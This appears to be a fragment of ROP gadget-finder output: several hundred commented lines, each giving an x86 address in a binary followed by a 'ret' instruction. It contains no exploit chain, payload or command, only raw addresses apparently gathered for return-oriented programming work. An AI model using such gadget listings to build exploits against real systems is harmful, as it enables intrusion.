# 0807f62e:	ret
# 0807f69c:	ret
# 0807f6a9:	ret
# 0807f6ef:	ret
# 0807f70b:	ret
# 0807f72e:	ret
# 0807f8f7:	ret
# 0807f94b:	ret
# 0807f9ae:	ret
# 0807fc40:	ret
# 0807ff0e:	ret
# 080800a3:	ret
# 080800fc:	ret
# 080802dd:	ret
# 0808035c:	ret
# 080803ac:	ret
# 080803cc:	ret
# 080803de:	ret
# 08080479:	ret
# 080804bd:	ret
# 0808051b:	ret
# 080805dd:	ret
# 08080649:	ret
# 080806c0:	ret
# 0808074c:	ret
# 08080784:	ret
# 0808094f:	ret
# 08080d59:	ret
# 08080d73:	ret
# 08080e8b:	ret
# 080810ea:	ret
# 08081173:	ret
# 08081207:	ret
# 08081256:	ret
# 080813c8:	ret
# 08081480:	ret
# 080815aa:	ret
# 080816ec:	ret
# 080817b5:	ret
# 08081889:	ret
# 080818e4:	ret
# 08081930:	ret
# 08081a1e:	ret
# 08081a3e:	ret
# 08081a3f:	ret
# 08081a93:	ret
# 08081d1c:	ret
# 08081d45:	ret
# 08081d5a:	ret
# 08081e79:	ret
# 08081f40:	ret
# 08081f92:	ret
# 08082143:	ret
# 08082202:	ret
# 0808220d:	ret
# 08082215:	ret
# 08082217:	ret
# 08082382:	ret
# 080824db:	ret
# 0808250a:	ret
# 0808252a:	ret
# 08082583:	ret
# 0808288e:	ret
# 08082905:	ret
# 0808291a:	ret
# 08082949:	ret
# 08082983:	ret
# 0808298e:	ret
# 08082997:	ret
# 080829b8:	ret
# 08082a20:	ret
# 08082a55:	ret
# 08082a70:	ret
# 08082aa5:	ret
# 08082abc:	ret
# 08082b01:	ret
# 08082b76:	ret
# 08082b92:	ret
# 08082cdb:	ret
# 08082ceb:	ret
# 08082d2c:	ret
# 08082db2:	ret
# 08082dde:	ret
# 08082dfe:	ret
# 08082e07:	ret
# 08082e33:	ret
# 08082e69:	ret
# 08082ea7:	ret
# 08082ec0:	ret
# 08082ed8:	ret
# 08082f14:	ret
# 08082f2e:	ret
# 08082f4c:	ret
# 08082f54:	ret
# 08082faa:	ret
# 0808302d:	ret
# 08083159:	ret
# 08083174:	ret
# 080831ad:	ret
# 0808321a:	ret
# 0808337c:	ret
# 080833bf:	ret
# 080833f6:	ret
# 0808348c:	ret
# 08083497:	ret
# 080834ee:	ret
# 0808381d:	ret
# 080838ae:	ret
# 08083b64:	ret
# 08083cf9:	ret
# 08083dfc:	ret
# 08083e17:	ret
# 08083e64:	ret
# 08083e8d:	ret
# 08083eb4:	ret
# 0808421c:	ret
# 0808432a:	ret
# 0808439f:	ret
# 080843ae:	ret
# 0808442d:	ret
# 08084866:	ret
# 0808488e:	ret
# 080848ea:	ret
# 0808491f:	ret
# 08084960:	ret
# 08084a03:	ret
# 08084e59:	ret
# 08084e6c:	ret
# 08084e82:	ret
# 08084f19:	ret
# 08084f46:	ret
# 08084fa2:	ret
# 08084fbe:	ret
# 0808510d:	ret
# 08085123:	ret
# 08085405:	ret
# 08085442:	ret
# 0808548c:	ret
# 080854be:	ret
# 080854fc:	ret
# 0808552e:	ret
# 080856ea:	ret
# 08085783:	ret
# 08085aa6:	ret
# 08085c85:	ret
# 08085c97:	ret
# 08085d6e:	ret
# 08085e19:	ret
# 08085e1e:	ret
# 08085e8e:	ret
# 08085f8d:	ret
# 08085f9e:	ret
# 08085fd8:	ret
# 080860de:	ret
# 08086212:	ret
# 08086678:	ret
# 0808683f:	ret
# 0808696b:	ret
# 08086ca1:	ret
# 08086e0e:	ret
# 08086ee3:	ret
# 08086efc:	ret
# 08086f4c:	ret
# 08087019:	ret
# 0808701e:	ret
# 080871a6:	ret
# 08087310:	ret
# 0808732d:	ret
# 0808734e:	ret
# 08087390:	ret
# 08087425:	ret
# 0808757c:	ret
# 080875a9:	ret
# 080875e0:	ret
# 0808777b:	ret
# 08087814:	ret
# 08087b09:	ret
# 08087be6:	ret
# 08087c2a:	ret
# 08087c79:	ret
# 08087cbb:	ret
# 08087d49:	ret
# 08087d5e:	ret
# 08087dda:	ret
# 08087dfd:	ret
# 08087e14:	ret
# 08087e7d:	ret
# 08087e98:	ret
# 08087ee4:	ret
# 08087f03:	ret
# 08087f12:	ret
# 08087f2b:	ret
# 08087f55:	ret
# 08088069:	ret
# 080880c9:	ret
# 08088106:	ret
# 08088289:	ret
# 0808838d:	ret
# 08088447:	ret
# 08088534:	ret
# 0808853e:	ret
# 08088542:	ret
# 0808858e:	ret
# 080885c2:	ret
# 080885f6:	ret
# 0808862f:	ret
# 080886ac:	ret
# 080887e9:	ret
# 08088a3e:	ret
# 08088a3f:	ret
# 08088bef:	ret
# 08088c0f:	ret
# 08088c2f:	ret
# 08088c4f:	ret
# 08088c6f:	ret
# 08088c8f:	ret
# 08088cb2:	ret
# 08088cd8:	ret
# 0808925f:	ret
# 080894bd:	ret
# 08089539:	ret
# 08089573:	ret
# 080896f4:	ret
# 0808970c:	ret
# 08089725:	ret
# 08089752:	ret
# 0808977b:	ret
# 08089794:	ret
# 080897ab:	ret
# 080897d6:	ret
# 08089820:	ret
# 08089837:	ret
# 0808988a:	ret
# 08089953:	ret
# 0808997c:	ret
# 08089a62:	ret
# 08089b03:	ret
# 08089b48:	ret
# 08089b8a:	ret
# 08089c13:	ret
# 08089c3c:	ret
# 08089c88:	ret
# 08089d0a:	ret
# 08089d19:	ret
# 08089d1e:	ret
# 08089f34:	ret
# 0808ab59:	ret
# 0808ad1c:	ret
# 0808ad56:	ret
# 0808ad91:	ret
# 0808addc:	ret
# 0808ae16:	ret
# 0808ae51:	ret
# 0808ae9e:	ret
# 0808aeec:	ret
# 0808af1d:	ret
# 0808afae:	ret
# 0808b0d1:	ret
# 0808b163:	ret
# 0808b1be:	ret
# 0808b21c:	ret
# 0808b2cd:	ret
# 0808b2ee:	ret
# 0808b34c:	ret
# 0808b39f:	ret
# 0808b3b2:	ret
# 0808b560:	ret
# 0808b73e:	ret
# 0808b73f:	ret
# 0808b85a:	ret
# 0808b8cf:	ret
# 0808b8dc:	ret
# 0808b92e:	ret
# 0808b98d:	ret
# 0808b99b:	ret
# 0808b9b8:	ret
# 0808b9d1:	ret
# 0808ba01:	ret
# 0808ba24:	ret
# 0808ba44:	ret
# 0808ba61:	ret
# 0808baab:	ret
# 0808baee:	ret
# 0808bc49:	ret
# 0808c62e:	ret
# 0808c681:	ret
# 0808c72e:	ret
# 0808c7c8:	ret
# 0808cadc:	ret
# 0808cb4c:	ret
# 0808cd68:	ret
# 0808cdf2:	ret
# 0808cf1a:	ret
# 0808cfbd:	ret
# 0808d01e:	ret
# 0808d039:	ret
# 0808d077:	ret
# 0808d088:	ret
# 0808d0a2:	ret
# 0808d0dd:	ret
# 0808d251:	ret
# 0808d3c3:	ret
# 0808d403:	ret
# 0808d46e:	ret
# 0808d494:	ret
# 0808d4c5:	ret
# 0808d665:	ret
# 0808d761:	ret
# 0808d7d1:	ret
# 0808d907:	ret
# 0808d90b:	ret
# 0808d93a:	ret
# 0808d95a:	ret
# 0808d96c:	ret
# 0808d970:	ret
# 0808da2b:	ret
# 0808da45:	ret
# 0808db36:	ret
# 0808dbd8:	ret
# 0808dbfc:	ret
# 0808dceb:	ret
# 0808e1af:	ret
# 0808e1f6:	ret
# 0808e2bc:	ret
# 0808e5ee:	ret
# 0808e7f1:	ret
# 0808eb94:	ret
# 0808ecda:	ret
# 0808ee06:	ret
# 0808eeb8:	ret
# 0808f423:	ret
# 0808f8d8:	ret
# 0808f9bc:	ret
# 0808fb37:	ret
# 0808fe62:	ret
# 08090288:	ret
# 08090408:	ret
# 08090491:	ret
# 08090530:	ret
# 0809067d:	ret
# 08090a2d:	ret
# 08090a39:	ret
# 08090a45:	ret
# 08090a53:	ret
# 08090f43:	ret
# 08090fa1:	ret
# 08090ff1:	ret
# 08091104:	ret
# 08091232:	ret
# 08091351:	ret
# 080913c9:	ret
# 08091435:	ret
# 08091455:	ret
# 080916d8:	ret
# 080917b4:	ret
# 080919b4:	ret
# 08091b1d:	ret
# 08091bd1:	ret
# 08091d3a:	ret
# 08091f49:	ret
# 080925d0:	ret
# 08092f71:	ret
# 08093188:	ret
# 080932c9:	ret
# 080934a5:	ret
# 080939a0:	ret
# 08093dd9:	ret
# 08094050:	ret
# 080940d5:	ret
# 0809416e:	ret
# 0809449d:	ret
# 08094609:	ret
# 080946ea:	ret
# 08094717:	ret
# 080947b2:	ret
# 080947d1:	ret
# 080947f0:	ret
# 08094914:	ret
# 08094944:	ret
# 0809495e:	ret
# 08094a98:	ret
# 08094aa5:	ret
# 08094b7e:	ret
# 08094bdc:	ret
# 08094cb5:	ret
# 08094d5e:	ret
# 08094dd4:	ret
# 08094e30:	ret
# 08095019:	ret
# 08095036:	ret
# 080950ab:	ret
# 080950d0:	ret
# 080950eb:	ret
# 08095108:	ret
# 0809511c:	ret
# 08095136:	ret
# 08095193:	ret
# 080951ce:	ret
# 080952bb:	ret
# 080952dd:	ret
# 0809535f:	ret
# 080953ab:	ret
# 080953cd:	ret
# 08095461:	ret
# 0809554e:	ret
# 0809566a:	ret
# 080956bb:	ret
# 08095752:	ret
# 080957a0:	ret
# 08095828:	ret
# 08095845:	ret
# 0809588c:	ret
# 080958ad:	ret
# 080958be:	ret
# 080959c1:	ret
# 08095a70:	ret
# 08095aa4:	ret
# 08095abe:	ret
# 08095b7f:	ret
# 08096170:	ret
# 0809627f:	ret
# 080964f9:	ret
# 08096a51:	ret
# 08096a6e:	ret
# 08096b56:	ret
# 08096b7e:	ret
# 08096c60:	ret
# 08096d65:	ret
# 08096fec:	ret
# 08097048:	ret
# 08097080:	ret
# 080970a0:	ret
# 08097138:	ret
# 080977d1:	ret
# 08097c78:	ret
# 08097c8a:	ret
# 08097c9e:	ret
# 08097cbf:	ret
# 08097cee:	ret
# 08097d55:	ret
# 08097dbc:	ret
# 08097dda:	ret
# 08097e05:	ret
# 08097ef1:	ret
# 08097f52:	ret
# 08097fe6:	ret
# 08098306:	ret
# 08098353:	ret
# 08098500:	ret
# 08098671:	ret
# 0809898c:	ret
# 080989cb:	ret
# 080989fe:	ret
# 08098ab0:	ret
# 08098b4c:	ret
# 08098ba0:	ret
# 08098c2b:	ret
# 08098c52:	ret
# 08098c5e:	ret
# 08098e5e:	ret
# 08098eef:	ret
# 080993e1:	ret
# 08099448:	ret
# 080994c8:	ret
# 080995ea:	ret
# 08099675:	ret
# 08099692:	ret
# 08099736:	ret
# 0809979e:	ret
# 0809980e:	ret
# 08099826:	ret
# 08099831:	ret
# 08099874:	ret
# 080998f0:	ret
# 08099913:	ret
# 08099927:	ret
# 0809993e:	ret
# 0809993f:	ret
# 08099a9d:	ret
# 08099bc1:	ret
# 08099bdd:	ret
# 08099be8:	ret
# 08099bed:	ret
# 0809a152:	ret
# 0809a1e5:	ret
# 0809a2e5:	ret
# 0809a559:	ret
# 0809a607:	ret
# 0809a897:	ret
# 0809a8e5:	ret
# 0809aacf:	ret
# 0809aecd:	ret
# 0809aef9:	ret
# 0809b064:	ret
# 0809b073:	ret
# 0809b0a9:	ret
# 0809b69d:	ret
# 0809b843:	ret
# 0809b877:	ret
# 0809bb0f:	ret
# 0809c0b7:	ret
# 0809c279:	ret
# 0809c45e:	ret
# 0809c482:	ret
# 0809c4a1:	ret
# 0809c502:	ret
# 0809c820:	ret
# 0809ca67:	ret
# 0809cea3:	ret
# 0809d09e:	ret
# 0809d313:	ret
# 0809d41d:	ret
# 0809d4dc:	ret
# 0809d4e3:	ret
# 0809d782:	ret
# 0809ddbc:	ret
# 0809ddcb:	ret
# 0809de69:	ret
# 0809dfa8:	ret
# 0809e090:	ret
# 0809e0ce:	ret
# 0809e114:	ret
# 0809e1d6:	ret
# 0809e34f:	ret
# 0809e364:	ret
# 0809e43e:	ret
# 0809e454:	ret
# 0809e46d:	ret
# 0809e4d5:	ret
# 0809e5a5:	ret
# 0809e5bb:	ret
# 0809e5da:	ret
# 0809e610:	ret
# 0809e646:	ret
# 0809e6b2:	ret
# 0809e6cc:	ret
# 0809e6f1:	ret
# 0809e7c1:	ret
# 0809e7e0:	ret
# 0809e8f2:	ret
# 0809e9ec:	ret
# 0809ea09:	ret
# 0809ec71:	ret
# 0809ecd3:	ret
# 0809ed40:	ret
# 0809ee26:	ret
# 0809ee90:	ret
# 0809eee5:	ret
# 0809eeed:	ret
# 0809eeff:	ret
# 0809ef0b:	ret
# 0809f170:	ret
# 0809f182:	ret
# 0809f30e:	ret
# 0809f3c4:	ret
# 0809f40b:	ret
# 0809f43c:	ret
# 0809f46d:	ret
# 0809f496:	ret
# 0809f515:	ret
# 0809f5d9:	ret
# 0809f615:	ret
# 0809f672:	ret
# 0809f7fe:	ret
# 0809f8f6:	ret
# 0809fde0:	ret
# 0809fdf1:	ret
# 0809fdfe:	ret
# 0809fe06:	ret
# 0809ffac:	ret
# 0809ffbc:	ret
# 080a0101:	ret
# 080a0471:	ret
# 080a08e9:	ret
# 080a08f8:	ret
# 080a09eb:	ret
# 080a0add:	ret
# 080a1084:	ret
# 080a1920:	ret
# 080a1a87:	ret
# 080a1cde:	ret
# 080a1cf0:	ret
# 080a1d99:	ret
# 080a1e2b:	ret
# 080a1e3d:	ret
# 080a2228:	ret
# 080a26cf:	ret
# 080a2b58:	ret
# 080a2b69:	ret
# 080a2fbe:	ret
# 080a3067:	ret
# 080a3545:	ret
# 080a37c0:	ret
# 080a37d6:	ret
# 080a384d:	ret
# 080a392e:	ret
# 080a3bb2:	ret
# 080a3c24:	ret
# 080a3c36:	ret
# 080a433f:	ret
# 080a4397:	ret
# 080a43b8:	ret
# 080a43d7:	ret
# 080a43ec:	ret
# 080a45e8:	ret
# 080a46d6:	ret
# 080a4742:	ret
# 080a475e:	ret
# 080a4a47:	ret
# 080a4b72:	ret
# 080a4dea:	ret
# 080a4e59:	ret
# 080a4eb9:	ret
# 080a4f3d:	ret
# 080a4f51:	ret
# 080a4f97:	ret
# 080a5021:	ret
# 080a506e:	ret
# 080a5090:	ret
# 080a5255:	ret
# 080a52d9:	ret
# 080a539e:	ret
# 080a546f:	ret
# 080a54b9:	ret
# 080a5555:	ret
# 080a55d5:	ret
# 080a55fb:	ret
# 080a5662:	ret
# 080a567c:	ret
# 080a569a:	ret
# 080a5742:	ret
# 080a58ee:	ret
# 080a591b:	ret
# 080a594d:	ret
# 080a595c:	ret
# 080a59a0:	ret
# 080a59ce:	ret
# 080a5a0b:	ret
# 080a5b5c:	ret
# 080a5bb7:	ret
# 080a5c34:	ret
# 080a5c42:	ret
# 080a5c5e:	ret
# 080a5d75:	ret
# 080a5db1:	ret
# 080a5dda:	ret
# 080a5e19:	ret
# 080a5e2b:	ret
# 080a5e63:	ret
# 080a5e71:	ret
# 080a5ede:	ret
# 080a5f01:	ret
# 080a5f58:	ret
# 080a5f71:	ret
# 080a6035:	ret
# 080a604a:	ret
# 080a60d1:	ret
# 080a6195:	ret
# 080a61a5:	ret
# 080a62ad:	ret
# 080a62e7:	ret
# 080a634b:	ret
# 080a63a7:	ret
# 080a641b:	ret
# 080a6421:	ret
# 080a6429:	ret
# 080a646b:	ret
# 080a64b8:	ret
# 080a64ce:	ret
# 080a6509:	ret
# 080a6590:	ret
# 080a65ae:	ret
# 080a65fb:	ret
# 080a660e:	ret
# 080a66e3:	ret
# 080a6731:	ret
# 080a674b:	ret
# 080a678a:	ret
# 080a679e:	ret
# 080a683d:	ret
# 080a6a05:	ret
# 080a6a1c:	ret
# 080a6a4a:	ret
# 080a6a6a:	ret
# 080a6a7c:	ret
# 080a6abe:	ret
# 080a6acc:	ret
# 080a6b4f:	ret
# 080a6c5b:	ret
# 080a6c86:	ret
# 080a6c9b:	ret
# 080a6cb8:	ret
# 080a6ccb:	ret
# 080a6cf9:	ret
# 080a6d2a:	ret
# 080a6d75:	ret
# 080a6d8a:	ret
# 080a6d99:	ret
# 080a6da8:	ret
# 080a6dcd:	ret
# 080a6ddb:	ret
# 080a6df6:	ret
# 080a6e16:	ret
# 080a6e1e:	ret
# 080a6ea4:	ret
# 080a6f0f:	ret
# 080a6f17:	ret
# 080a6fb7:	ret
# 080a6fd4:	ret
# 080a7006:	ret
# 080a706c:	ret
# 080a708f:	ret
# 080a70c4:	ret
# 080a70fb:	ret
# 080a7120:	ret
# 080a713d:	ret
# 080a71d7:	ret
# 080a73dc:	ret
# 080a74a7:	ret
# 080a74d1:	ret
# 080a74f6:	ret
# 080a7520:	ret
# 080a75de:	ret
# 080a762d:	ret
# 080a764f:	ret
# 080a765c:	ret
# 080a76be:	ret
# 080a771b:	ret
# 080a7742:	ret
# 080a77b1:	ret
# 080a780f:	ret
# 080a7823:	ret
# 080a783e:	ret
# 080a783f:	ret
# 080a78ad:	ret
# 080a791c:	ret
# 080a7971:	ret
# 080a79ac:	ret
# 080a79be:	ret
# 080a79e2:	ret
# 080a7a84:	ret
# 080a7aa1:	ret
# 080a7aba:	ret
# 080a7af4:	ret
# 080a7b38:	ret
# 080a7b78:	ret
# 080a7be1:	ret
# 080a7c49:	ret
# 080a7c9e:	ret
# 080a7dd1:	ret
# 080a7e86:	ret
# 080a8006:	ret
# 080a8110:	ret
# 080a8187:	ret
# 080a8246:	ret
# 080a8292:	ret
# 080a82c7:	ret
# 080a830e:	ret
# 080a833a:	ret
# 080a83be:	ret
# 080a843b:	ret
# 080a849b:	ret
# 080a8525:	ret
# 080a8539:	ret
# 080a8629:	ret
# 080a8717:	ret
# 080a873c:	ret
# 080a8766:	ret
# 080a878f:	ret
# 080a8794:	ret
# 080a87a4:	ret
# 080a87b4:	ret
# 080a87c4:	ret
# 080a87d4:	ret
# 080a87e4:	ret
# 080a87f4:	ret
# 080a8804:	ret
# 080a8814:	ret
# 080a8824:	ret
# 080a8834:	ret
# 080a8844:	ret
# 080a8853:	ret
# 080a8896:	ret
# 080a88c9:	ret
# 080a8900:	ret
# 080a8939:	ret
# 080a894c:	ret
# 080a895c:	ret
# 080a896c:	ret
# 080a897c:	ret
# 080a898c:	ret
# 080a899c:	ret
# 080a89ae:	ret
# 080a89be:	ret
# 080a89ce:	ret
# 080a89de:	ret
# 080a89ee:	ret
# 080a89fe:	ret
# 080a8a7b:	ret
# 080a8a87:	ret
# 080a8afd:	ret
# 080a8b07:	ret
# 080a8b86:	ret
# 080a8b8f:	ret
# 080a8b99:	ret
# 080a8bcc:	ret
# 080a8bd3:	ret
# 080a8be5:	ret
# 080a8cc6:	ret
# 080a8d30:	ret
# 080a8dc7:	ret
# 080a8e09:	ret
# 080a8e2c:	ret
# 080a8e56:	ret
# 080a8e7f:	ret
# 080a8ed2:	ret
# 080a8efb:	ret
# 080a8f03:	ret
# 080a8f14:	ret
# 080a8f24:	ret
# 080a8f34:	ret
# 080a8f44:	ret
# 080a8f54:	ret
# 080a8f64:	ret
# 080a8f74:	ret
# 080a8f84:	ret
# 080a8f94:	ret
# 080a8fa4:	ret
# 080a8fb4:	ret
# 080a8ff4:	ret
# 080a9025:	ret
# 080a905f:	ret
# 080a9088:	ret
# 080a9093:	ret
# 080a90ad:	ret
# 080a90bd:	ret
# 080a90cd:	ret
# 080a90d9:	ret
# 080a90e9:	ret
# 080a90f9:	ret
# 080a9109:	ret
# 080a9119:	ret
# 080a9129:	ret
# 080a9139:	ret
# 080a9149:	ret
# 080a9153:	ret
# 080a91a6:	ret
# 080a91d2:	ret
# 080a920b:	ret
# 080a926e:	ret
# 080a92d5:	ret
# 080a92ea:	ret
# 080a936f:	ret
# 080a9384:	ret
# 080a93cd:	ret
# 080a93f3:	ret
# 080a9429:	ret
# 080a9438:	ret
# 080a9446:	ret
# 080a9458:	ret
# 080a9468:	ret
# 080a947a:	ret
# 080a948f:	ret
# 080a949f:	ret
# 080a94af:	ret
# 080a94b3:	ret
# 080a9516:	ret
# 080a9527:	ret
# 080a959b:	ret
# 080a95a8:	ret
# 080a95bb:	ret
# 080a9601:	ret
# 080a9ab9:	ret
# 080a9ac3:	ret
# 080a9d09:	ret
# 080a9d13:	ret
# 080a9f59:	ret
# 080a9f63:	ret
# 080aa1a9:	ret
# 080aa1b3:	ret
# 080aa3f9:	ret
# 080aa403:	ret
# 080aa649:	ret
# 080aa653:	ret
# 080aa899:	ret
# 080aa8a3:	ret
# 080aaae9:	ret
# 080aaaf3:	ret
# 080aad39:	ret
# 080aad43:	ret
# 080aae11:	ret
# 080aaf89:	ret
# 080aaf93:	ret
# 080ab1d9:	ret
# 080ab1e3:	ret
# 080ab429:	ret
# 080ab433:	ret
# 080ab679:	ret
# 080ab683:	ret
# 080ab8c9:	ret
# 080ab8d3:	ret
# 080abb19:	ret
# 080abb23:	ret
# 080abc5d:	ret
# 080abc81:	ret
# 080abcb3:	ret
# 080abce3:	ret
# 080abd13:	ret
# 080abd43:	ret
# 080abd73:	ret
# 080abda3:	ret
# 080abe18:	ret
# 080abe2e:	ret
# 080abe39:	ret
# 080ac103:	ret
# 080ac120:	ret
# 080ac13b:	ret
# 080ac181:	ret
# 080ac4d5:	ret
# 080ac4e6:	ret
# 080ac4fc:	ret
# 080ac51d:	ret
# 080ac6f2:	ret
# 080ac765:	ret
# 080ac798:	ret
# 080ac7c6:	ret
# 080ac7f3:	ret
# 080ac9ba:	ret
# 080acb7c:	ret
# 080acc31:	ret
# 080acc51:	ret
# 080acc6a:	ret
# 080accaf:	ret
# 080accb3:	ret
# 080accbf:	ret
# 080acce0:	ret
# 080accee:	ret
# 080accf6:	ret
# 080accf8:	ret
# 080acd0b:	ret
# 080acd2c:	ret
# 080acd3b:	ret
# 080acd5c:	ret
# 080acdbe:	ret
# 080acdc7:	ret
# 080acdde:	ret
# 080ace7a:	ret
# 080acf7e:	ret
# 080ad0c9:	ret
# 080ad1a6:	ret
# 080ad2f0:	ret
# 080ad30a:	ret
# 080ad313:	ret
# 080ad323:	ret
# 080ad332:	ret
# 080ad345:	ret
# 080ad355:	ret
# 080ad365:	ret
# 080ad375:	ret
# 080ad385:	ret
# 080ad395:	ret
# 080ad3a5:	ret
# 080ad3f2:	ret
# 080ad3fc:	ret
# 080ad508:	ret
# 080ad5d7:	ret
# 080ad60e:	ret
# 080ad69c:	ret
# 080ad71b:	ret
# 080ad77b:	ret
# 080ad7bb:	ret
# 080ad803:	ret
# 080ad81b:	ret
# 080ad85b:	ret
# 080ad86c:	ret
# 080ad897:	ret
# 080ad96f:	ret
# 080ad9da:	ret
# 080ad9de:	ret
# 080ada43:	ret
# 080adc17:	ret
# 080adc5e:	ret
# 080add17:	ret
# 080add8d:	ret
# 080ade09:	ret
# 080ade63:	ret
# 080ade80:	ret
# 080adea0:	ret
# 080adec0:	ret
# 080adee0:	ret
# 080adf11:	ret
# 080adf74:	ret
# 080adfdf:	ret
# 080adffd:	ret
# 080ae03b:	ret
# 080ae079:	ret
# 080ae0ac:	ret
# 080ae0bb:	ret
# 080ae0e4:	ret
# 080ae0ff:	ret
# 080ae110:	ret
# 080ae166:	ret
# 080ae18a:	ret
# 080ae1d2:	ret
# 080ae1ea:	ret
# 080ae2b8:	ret
# 080ae2f2:	ret
# 080ae2f8:	ret
# 080ae339:	ret
# 080ae36c:	ret
# 080ae37b:	ret
# 080ae3a4:	ret
# 080ae3bf:	ret
# 080ae3d0:	ret
# 080ae3f1:	ret
# 080ae41a:	ret
# 080ae497:	ret
# 080ae4bf:	ret
# 080ae4c6:	ret
# 080ae522:	ret
# 080ae54a:	ret
# 080ae556:	ret
# 080ae5c2:	ret
# 080ae5ea:	ret
# 080ae5f6:	ret
# 080ae60e:	ret
# 080ae65b:	ret
# 080ae701:	ret
# 080ae73b:	ret
# 080ae77c:	ret
# 080ae948:	ret
# 080ae9bf:	ret
# 080ae9cb:	ret
# 080aea5e:	ret
# 080aeaf6:	ret
# 080aeb0e:	ret
# 080aeb4e:	ret
# 080aee5d:	ret
# 080aef28:	ret
# 080aef3c:	ret
# 080aefe2:	ret
# 080af0f9:	ret
# 080af116:	ret
# 080af190:	ret
# 080af222:	ret
# 080af508:	ret
# 080afb74:	ret
# 080afbac:	ret
# 080afc65:	ret
# 080afcc0:	ret
# 080afcdb:	ret
# 080afcf0:	ret
# 080afd0e:	ret
# 080afe08:	ret
# 080afe71:	ret
# 080afe9d:	ret
# 080afeca:	ret
# 080afeda:	ret
# 080aff0e:	ret
# 080aff9c:	ret
# 080b007e:	ret
# 080b015e:	ret
# 080b09d4:	ret
# 080b0e0a:	ret
# 080b0e36:	ret
# 080b0e6a:	ret
# 080b0e86:	ret
# 080b0eb5:	ret
# 080b0ecc:	ret
# 080b0f1b:	ret
# 080b0f5b:	ret
# 080b0f6f:	ret
# 080b0f7e:	ret
# 080b1000:	ret
# 080b100e:	ret
# 080b104b:	ret
# 080b1059:	ret
# 080b1084:	ret
# 080b10a5:	ret
# 080b1167:	ret
# 080b11be:	ret
# 080b1203:	ret
# 080b123a:	ret
# 080b1380:	ret
# 080b1410:	ret
# 080b15c3:	ret
# 080b15d5:	ret
# 080b16fc:	ret
# 080b1732:	ret
# 080b178c:	ret
# 080b17ee:	ret
# 080b18a8:	ret
# 080b1904:	ret
# 080b1940:	ret
# 080b1ae7:	ret
# 080b1f08:	ret
# 080b1f8c:	ret
# 080b2214:	ret
# 080b222f:	ret
# 080b264c:	ret
# 080b2d8d:	ret
# 080b2ec9:	ret
# 080b329b:	ret
# 080b3780:	ret
# 080b37a3:	ret
# 080b3810:	ret
# 080b3863:	ret
# 080b38c1:	ret
# 080b38e5:	ret
# 080b3944:	ret
# 080b39be:	ret
# 080b39e6:	ret
# 080b3aba:	ret
# 080b3d52:	ret
# 080b3d7e:	ret
# 080b3dcd:	ret
# 080b3e74:	ret
# 080b3e85:	ret
# 080b3f90:	ret
# 080b4109:	ret
# 080b41f6:	ret
# 080b426e:	ret
# 080b4333:	ret
# 080b4428:	ret
# 080b4c92:	ret
# 080b4e0c:	ret
# 080b4ec1:	ret
# 080b4f19:	ret
# 080b4faa:	ret
# 080b5231:	ret
# 080b5289:	ret
# 080b52f9:	ret
# 080b55c4:	ret
# 080b57dd:	ret
# 080b5851:	ret
# 080b5aae:	ret
# 080b5bf8:	ret
# 080b5fa9:	ret
# 080b6007:	ret
# 080b60fe:	ret
# 080b617f:	ret
# 080b61c5:	ret
# 080b61ef:	ret
# 080b6349:	ret
# 080b6469:	ret
# 080b65eb:	ret
# 080b671f:	ret
# 080b6781:	ret
# 080b681a:	ret
# 080b683e:	ret
# 080b683f:	ret
# 080b6aa1:	ret
# 080b6c20:	ret
# 080b6c38:	ret
# 080b6c86:	ret
# 080b6cac:	ret
# 080b6cf1:	ret
# 080b6d0c:	ret
# 080b6d3f:	ret
# 080b6d7d:	ret
# 080b7004:	ret
# 080b7037:	ret
# 080b70b6:	ret
# 080b7302:	ret
# 080b7679:	ret
# 080b7d20:	ret
# 080b7d5b:	ret
# 080b8141:	ret
# 080b833c:	ret
# 080b84df:	ret
# 080b85ab:	ret
# 080b8e93:	ret
# 080b8edf:	ret
# 080b9016:	ret
# 080b9084:	ret
# 080b91b0:	ret
# 080b9251:	ret
# 080b9268:	ret
# 080b92c3:	ret
# 080b932a:	ret
# 080b957d:	ret
# 080b96d2:	ret
# 080b9743:	ret
# 080b98a8:	ret
# 080b994c:	ret
# 080b9ae0:	ret
# 080b9b72:	ret
# 080b9b97:	ret
# 080b9be0:	ret
# 080b9c42:	ret
# 080b9c82:	ret
# 080b9cb1:	ret
# 080b9cd1:	ret
# 080b9d21:	ret
# 080b9d2d:	ret
# 080b9d71:	ret
# 080b9e1d:	ret
# 080b9e78:	ret
# 080b9f0f:	ret
# 080b9f2d:	ret
# 080ba045:	ret
# 080ba0f0:	ret
# 080ba140:	ret
# 080ba15c:	ret
# 080ba17c:	ret
# 080ba4b6:	ret
# 080ba53f:	ret
# 080ba623:	ret
# 080ba643:	ret
# 080ba9e5:	ret
# 080baa10:	ret
# 080baa3b:	ret
# 080baa6d:	ret
# 080baa77:	ret
# 080baab7:	ret
# 080baadd:	ret
# 080babd3:	ret
# 080bac19:	ret
# 080bac2b:	ret
# 080bac4a:	ret
# 080bac5e:	ret
# 080bac60:	ret
# 080bac7d:	ret
# 080bacda:	ret
# 080bacfb:	ret
# 080bad09:	ret
# 080bad19:	ret
# 080bad1e:	ret
# 080baed5:	ret
# 080bb06e:	ret
# 080bb0d0:	ret
# 080bb0f4:	ret
# 080bb128:	ret
# 080bb144:	ret
# 080bb154:	ret
# 080bb176:	ret
# 080bb18e:	ret
# 080bb1e6:	ret
# 080bb30b:	ret
# 080bb37c:	ret
# 080bb391:	ret
# 080bb3d6:	ret
# 080bb40d:	ret
# 080bb431:	ret
# 080bb4fc:	ret
# 080bb53c:	ret
# 080bb552:	ret
# 080bb5fd:	ret
# 080bb640:	ret
# 080bb6de:	ret
# 080bb6e7:	ret
# 080bb7ac:	ret
# 080bb86b:	ret
# 080bb871:	ret
# 080bb908:	ret
# 080bb91c:	ret
# 080bb94e:	ret
# 080bba26:	ret
# 080bba5d:	ret
# 080bbaba:	ret
# 080bbb85:	ret
# 080bbc68:	ret
# 080bbce0:	ret
# 080bbdf9:	ret
# 080bbe1d:	ret
# 080bc0e1:	ret
# 080bc161:	ret
# 080bc18b:	ret
# 080bc3e1:	ret
# 080bc763:	ret
# 080bc801:	ret
# 080bc84b:	ret
# 080bc93b:	ret
# 080bc96d:	ret
# 080bc991:	ret
# 080bc9a3:	ret
# 080bcae6:	ret
# 080bcd28:	ret
# 080bce9d:	ret
# 080bcf0a:	ret
# 080bcf29:	ret
# 080bd549:	ret
# 080bd639:	ret
# 080bd86c:	ret
# 080bd8d4:	ret
# 080bda90:	ret
# 080bdaa7:	ret
# 080bdac5:	ret
# 080bdade:	ret
# 080bdb5c:	ret
# 080bdb9e:	ret
# 080bdc4a:	ret
# 080bdd64:	ret
# 080bded7:	ret
